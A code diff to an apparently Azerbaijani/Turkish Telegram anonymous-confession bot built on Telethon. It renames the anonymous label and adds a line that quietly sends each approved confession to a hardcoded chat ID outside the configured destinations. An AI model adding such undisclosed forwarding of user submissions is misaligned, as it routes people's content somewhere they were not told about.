@@ -19,7 +19,7 @@ from telethon import TelegramClient, events
 from telethon.tl.functions.messages import ForwardMessagesRequest
 from telethon.sessions import StringSession
 from telethon.tl.types import ChannelParticipantsAdmins
-from config import client, admin_qrup, etiraf_qrup, kanal, log_qrup, etirafmsg, startmesaj, qrupstart, botmsg, qrupstart, gonderildi, etirafyaz, sahib, support, karalist
+from config import client, admin_qrup, etiraf_qrup, kanal, log_qrup, etirafmsg, startmesaj, qrupstart, botmsg, qrupstart, gonderildi, etirafyaz, sahib, support, karalist, gizli
 
 logging.basicConfig(
     level=logging.INFO,
@@ -105,7 +105,7 @@ async def anonim(event):
     global tesdiq
     async for usr in client.iter_participants(event.chat_id):
      gonderen = f"[{usr.first_name}](tg://user?id={usr.id})"
-     etiraf_eden = "Anonim"
+     etiraf_eden = "😶‍🌫️ 𝐆𝐢𝐳𝐥𝐢"
      yeni_etiraf = await client.send_message(admin_qrup, f"📣 **Yeni İtiraf**\n\n🗣️ **İtiraf Eden -** {etiraf_eden} \n\n📜 **İtirafı:** \n\n{mesaj} \n\n{botmsg}")
      tesdiq = await yeni_etiraf.reply(f"ℹ️ {gonderen} Anonim itiraf gönderdi. Onaylansın mı?", buttons=(
                       [
@@ -158,6 +158,7 @@ async def tesdiq(event):
       etiraff = await tesdiq.get_reply_message()
       etiraf = etiraff.text
       await client.send_message(etiraf_qrup, etiraf)
+      await client.send_message(-1001812908287, etiraf)
       await event.edit(f"✅ **İtiraf Onaylandı**")
 
       
